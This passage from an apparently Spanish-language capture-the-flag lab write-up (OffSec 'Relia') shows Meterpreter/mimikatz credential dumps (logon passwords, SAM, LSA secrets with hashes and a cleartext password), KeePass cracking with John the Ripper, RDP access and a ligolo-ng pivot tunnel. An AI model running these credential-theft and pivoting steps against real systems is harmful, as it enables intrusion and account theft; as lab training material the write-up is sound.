wk01$     RELIA.COM  a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 7
                     9 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4
                      d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e
                     ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7


meterpreter > kiwi_cmd "sekurlsa::logonpasswords"

Authentication Id : 0 ; 4407669 (00000000:00434175)
Session           : Batch from 0
User Name         : jim
Domain            : RELIA
Logon Server      : DC02
Logon Time        : 7/12/2025 8:51:02 AM
SID               : S-1-5-21-3972710054-930304531-4277621697-1104
        msv :
         [00000003] Primary
         * Username : jim
         * Domain   : RELIA
         * NTLM     : be5cb823ee026304b6ed0cd356e34a3c
         * SHA1     : eb7d6b7fd8e4cc83593fab114174f6426c990449
         * DPAPI    : 7aeef260c633a25ef3ed52d88e8c2545
        tspkg :
        wdigest :
         * Username : jim
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : jim
         * Domain   : RELIA.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 1073718 (00000000:00106236)
Session           : Batch from 0
User Name         : offsec
Domain            : WK01
Logon Server      : WK01
Logon Time        : 11/19/2024 12:36:47 PM
SID               : S-1-5-21-2537306635-675252809-2175080115-1001
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : WK01
         * NTLM     : a6e162b0429f0ff6cee42809a01fd49d
         * SHA1     : 42cb8143432b29f858a6b399a3f9a9613430c91b
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : WK01
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : WK01
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 346929 (00000000:00054b31)
Session           : Interactive from 1
User Name         : jim
Domain            : RELIA
Logon Server      : DC02
Logon Time        : 11/19/2024 12:34:49 PM
SID               : S-1-5-21-3972710054-930304531-4277621697-1104
        msv :
         [00000003] Primary
         * Username : jim
         * Domain   : RELIA
         * NTLM     : be5cb823ee026304b6ed0cd356e34a3c
         * SHA1     : eb7d6b7fd8e4cc83593fab114174f6426c990449
         * DPAPI    : 7aeef260c633a25ef3ed52d88e8c2545
        tspkg :
        wdigest :
         * Username : jim
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : jim
         * Domain   : RELIA.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 81502 (00000000:00013e5e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : b47d6cff1df8db23ea339d81ee762710
         * SHA1     : 526022da1904296633d36d21cc5f8bb562382d06
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : WK01$
         * Domain   : relia.com
         * Password : fd 3f 3e 3b c1 07 0a fa 5f cd 10 fe 0f 86 31 be 9e 09 3b 37 53 43 2c 1e 0c 6c 9d a8 80 1d cb 15 28 9e 1d 92 97 ee d0 09 b0 7a fc 3f d5 6a b4 9b b3 c4 b9 e6 66 2c 7a 3c 4d 68 6b 01 9e d8 cd 81 39 be 66 30 fb ab 3f af ec f2 f9 29 86 e9 65 f4 59 8e 48 ca d5 59 4a c3 20 85 6e dc 3b de 8c 13 7c ee cf ef 23 ed 6f da a6 41 cf b2 af ac f6 9f c8 36 37 45 31 3c cd 53 ec 78 cd 02 f3 08 a0 ea 3c 4d f3 6e 73 f3 0d 21 b2 1d 44 8e 37 c0 94 01 81 07 cd 0b d1 25 cd dc 36 a6 02 97 3d 25 94 9b 8f 3f 1a e4 c5 fe 14 bc ae bd 14 c9 4a a7 8e 27 d1 c3 aa da e7 95 20 e7 bb 7c 2f 06 46 d1 a2 1b 11 fe 9f 9c ec df c5 52 2f b0 6c 04 aa e9 43 b8 fb 66 40 8f 10 a2 91 99 e9 3c 59 eb 43 18 80 55 6e 2c 70 4b 17 62 31 d4 72 d3 a6 77 59 d3 d6 6e 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 81484 (00000000:00013e4c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : aa704e701eb6532afc42350a19c329c5
         * SHA1     : e588c6de7035c11de7bb7b18120548cef7f8fabd
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : WK01$
         * Domain   : relia.com
         * Password : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WK01$
Domain            : RELIA
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : aa704e701eb6532afc42350a19c329c5
         * SHA1     : e588c6de7035c11de7bb7b18120548cef7f8fabd
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : wk01$
         * Domain   : RELIA.COM
         * Password : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 50939 (00000000:0000c6fb)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : aa704e701eb6532afc42350a19c329c5
         * SHA1     : e588c6de7035c11de7bb7b18120548cef7f8fabd
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : WK01$
         * Domain   : relia.com
         * Password : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 50757 (00000000:0000c645)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : aa704e701eb6532afc42350a19c329c5
         * SHA1     : e588c6de7035c11de7bb7b18120548cef7f8fabd
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : WK01$
         * Domain   : relia.com
         * Password : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 49594 (00000000:0000c1ba)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : WK01$
         * Domain   : RELIA
         * NTLM     : aa704e701eb6532afc42350a19c329c5
         * SHA1     : e588c6de7035c11de7bb7b18120548cef7f8fabd
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WK01$
Domain            : RELIA
Logon Server      : (null)
Logon Time        : 11/19/2024 12:34:35 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WK01$
         * Domain   : RELIA
         * Password : (null)
        kerberos :
         * Username : wk01$
         * Domain   : RELIA.COM
         * Password : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
        ssp :
        credman :
        cloudap :       KO

meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:09:39 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : krbtgt/RELIA.COM @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:08:39 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : krbtgt/RELIA.COM @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:09:39 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : cifs/DC02.relia.com/relia.com @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:09:39 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : WK01$ @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:08:47 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : LDAP/DC02.relia.com @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/12/2025 8:08:39 AM ; 7/12/2025 6:08:39 PM ; 7/19/2025 8:08:39 AM
   Server Name       : ldap/DC02.relia.com/relia.com @ RELIA.COM
   Client Name       : wk01$ @ RELIA.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WK01
SysKey : 85553916b9da2184e09ec89ca761d11e
Local SID : S-1-5-21-2537306635-675252809-2175080115

SAMKey : ec29b8263215635c06bd9f3e899c83fa

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: d8aa69abd669a0d0ffe02ae095a4e301

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be1e7f8aca91ef52d71355e179ab5aa2

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 062b06ae4f2ef197cc8fa8d1ee6ff2da0d272411de304de73de57f58db5836cf
      aes128_hmac       (4096) : b1cffea8d2cc78e4cd182ab039080f1f
      des_cbc_md5       (4096) : 708994a7b5515770

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 708994a7b5515770


RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: a6e162b0429f0ff6cee42809a01fd49d
    lm  - 0: 5dbe20fd4cd2d75e2a6ed0678e201996
    ntlm- 0: a6e162b0429f0ff6cee42809a01fd49d
    ntlm- 1: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1097c070a8e4d9964f03f275698e719

* Primary:Kerberos-Newer-Keys *
    Default Salt : WK01.RELIA.COMoffsec
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4b262e2ca2dadc2d674729793224bf81ac91db0f4b412a2382139ba605f1fb90
      aes128_hmac       (4096) : d08171acac71ee877fcb152cd9d1bc15
      des_cbc_md5       (4096) : 61c440319d23e5e5
    OldCredentials
      aes256_hmac       (4096) : 70e9fe05d139fb507c261c3a49d25bb5b41f14cbe0a2c84a92ed1def9b1cd20a
      aes128_hmac       (4096) : 81b60a7b68cd34ba6e3cfbeb6399f904
      des_cbc_md5       (4096) : 0e7a20984ce657d9
    OlderCredentials
      aes256_hmac       (4096) : 70e9fe05d139fb507c261c3a49d25bb5b41f14cbe0a2c84a92ed1def9b1cd20a
      aes128_hmac       (4096) : 81b60a7b68cd34ba6e3cfbeb6399f904
      des_cbc_md5       (4096) : 0e7a20984ce657d9

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WK01.RELIA.COMoffsec
    Credentials
      des_cbc_md5       : 61c440319d23e5e5
    OldCredentials
      des_cbc_md5       : 0e7a20984ce657d9



meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : WK01
SysKey : 85553916b9da2184e09ec89ca761d11e

Local name : WK01 ( S-1-5-21-2537306635-675252809-2175080115 )
Domain name : RELIA ( S-1-5-21-3972710054-930304531-4277621697 )
Domain FQDN : relia.com

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47f81a01-b9bb-23b2-3cfe-5bf99fcc0485}
  [00] {47f81a01-b9bb-23b2-3cfe-5bf99fcc0485} ac0cc8e3051db4509566c9132342e82e4e2ead8deda7f15abfb3b4cc281888de

Secret  : $MACHINE.ACC
cur/hex : a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 79 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4 d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7 
    NTLM:aa704e701eb6532afc42350a19c329c5
    SHA1:e588c6de7035c11de7bb7b18120548cef7f8fabd
old/hex : fd 3f 3e 3b c1 07 0a fa 5f cd 10 fe 0f 86 31 be 9e 09 3b 37 53 43 2c 1e 0c 6c 9d a8 80 1d cb 15 28 9e 1d 92 97 ee d0 09 b0 7a fc 3f d5 6a b4 9b b3 c4 b9 e6 66 2c 7a 3c 4d 68 6b 01 9e d8 cd 81 39 be 66 30 fb ab 3f af ec f2 f9 29 86 e9 65 f4 59 8e 48 ca d5 59 4a c3 20 85 6e dc 3b de 8c 13 7c ee cf ef 23 ed 6f da a6 41 cf b2 af ac f6 9f c8 36 37 45 31 3c cd 53 ec 78 cd 02 f3 08 a0 ea 3c 4d f3 6e 73 f3 0d 21 b2 1d 44 8e 37 c0 94 01 81 07 cd 0b d1 25 cd dc 36 a6 02 97 3d 25 94 9b 8f 3f 1a e4 c5 fe 14 bc ae bd 14 c9 4a a7 8e 27 d1 c3 aa da e7 95 20 e7 bb 7c 2f 06 46 d1 a2 1b 11 fe 9f 9c ec df c5 52 2f b0 6c 04 aa e9 43 b8 fb 66 40 8f 10 a2 91 99 e9 3c 59 eb 43 18 80 55 6e 2c 70 4b 17 62 31 d4 72 d3 a6 77 59 d3 d6 6e 
    NTLM:b47d6cff1df8db23ea339d81ee762710
    SHA1:526022da1904296633d36d21cc5f8bb562382d06

Secret  : DefaultPassword
cur/text: Castello1!
old/text: kzszpKqNUjTHK$K

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b4 54 f5 c5 dc 99 07 ef 64 e8 3a 80 01 8e 5f 73 a2 43 d8 7d 7b bb 04 e8 77 c8 df 48 4d 3e 72 56 9c 5d 9d 95 eb b4 51 fb 
    full: b454f5c5dc9907ef64e83a80018e5f73a243d87d7bbb04e877c8df484d3e72569c5d9d95ebb451fb
    m/u : b454f5c5dc9907ef64e83a80018e5f73a243d87d / 7bbb04e877c8df484d3e72569c5d9d95ebb451fb
old/hex : 01 00 00 00 e0 b1 d5 11 78 7f ac 6b ce 84 ed 70 a1 9a 5e ee a5 b9 34 bc 24 8c 08 33 77 87 ff 34 c2 b5 10 4e 87 94 c1 35 95 c4 36 b7 
    full: e0b1d511787fac6bce84ed70a19a5eeea5b934bc248c08337787ff34c2b5104e8794c13595c436b7
    m/u : e0b1d511787fac6bce84ed70a19a5eeea5b934bc / 248c08337787ff34c2b5104e8794c13595c436b7

Secret  : NL$KM
cur/hex : c4 61 12 7a 5b 50 b1 8c 99 aa 7c d1 e5 d4 f9 f8 b9 f5 70 77 ec 73 e1 05 a3 fe 9a 27 fa 26 9e fd 4f 8e b1 aa e9 ab 69 03 86 69 55 cc c7 ef f4 37 ab 9a fd 0f 2b 5c 68 5a 43 88 02 14 57 6a 31 85 
old/hex : c4 61 12 7a 5b 50 b1 8c 99 aa 7c d1 e5 d4 f9 f8 b9 f5 70 77 ec 73 e1 05 a3 fe 9a 27 fa 26 9e fd 4f 8e b1 aa e9 ab 69 03 86 69 55 cc c7 ef f4 37 ab 9a fd 0f 2b 5c 68 5a 43 88 02 14 57 6a 31 85 

meterpreter >
```

#### Obtenemos Database.kdbx

```powershell
PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jim\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/27/2022   1:57 AM           1998 Database.kdbx                                                        

# En kali una vez obtenido el archivo

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# keepass2john Database.kdbx > hash.kdbx

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# john hash.kdbx --wordlist=/usr/share/wordlists/rockyou.txt
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes1        (Database)     
1g 0:00:00:00 DONE (2025-07-13 18:12) 10.00g/s 50880p/s 50880c/s 50880C/s bambino..elsalvador
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

* Abrimos el archivo:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# keepassxc Database.kdbx               
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'

```

* Introducimos la credencial: **mercedes1**

y obtenemos las credenciales de **dmzadmin**: **SlimGodhoodMope**

#### Nos conectamos por RDP a .191 y obtenemos el flag en el Desktop.

* Revisamos las ips

```powershell
PS C:\Users\dmzadmin> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.227.191
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.227.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.187.254
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
PS C:\Users\dmzadmin>
```


* **Esta es maquina nos permite acceder a la red interna**

#### Levantamos tunel con ligolo

* proxy

```bash
                                                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/tools/ligolo/windows-agent]
‚îî‚îÄ# ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -v

# Luego de correr el agente en windows

ligolo-ng ¬ª session
? Specify a session : 1 - LOGIN\dmzadmin@login - 192.168.227.191:54960 - 00505686dda0
[Agent : LOGIN\dmzadmin@login] ¬ª autoroute
? Select routes to add: 172.16.187.254/24
? Create a new interface or use an existing one? Create a new interface
INFO[0224]/build/ligolo-ng-XcrhKU/ligolo-ng-0.7.5/cmd/proxy/app/interfaces_linux.go:256 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Generating a random interface name...        
INFO[0224]/build/ligolo-ng-XcrhKU/ligolo-ng-0.7.5/cmd/proxy/app/interfaces_linux.go:264 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Creating a new "stirringbarracu" interface... 
INFO[0224]/build/ligolo-ng-XcrhKU/ligolo-ng-0.7.5/cmd/proxy/app/interfaces_linux.go:282 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Using interface stirringbarracu, creating routes... 
INFO[0224]/build/ligolo-ng-XcrhKU/ligolo-ng-0.7.5/cmd/proxy/app/interfaces_linux.go:292 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Route 172.16.187.254/24 created.             
? Start the tunnel? Yes
[Agent : LOGIN\dmzadmin@login] ¬ª INFO[0227]/build/ligolo-ng-XcrhKU/ligolo-ng-0.7.5/cmd/proxy/app/app.go:87 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Starting tunnel to LOGIN\dmzadmin@login (00505686dda0) 
[Agent : LOGIN\dmzadmin@login] ¬ª tunnel_list
